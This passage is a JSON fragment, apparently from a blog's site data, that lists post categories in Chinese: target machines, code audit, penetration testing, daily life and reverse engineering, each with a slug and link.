靶机","link":"/categories/靶机/"},{"name":"代码审计","slug":"代码审计","link":"/categories/代码审计/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/渗透测试/"},{"name":"日常","slug":"日常","link":"/categories/日常/"},{"name":"逆向","slug":"逆向","link":"/categories/逆向/"}]}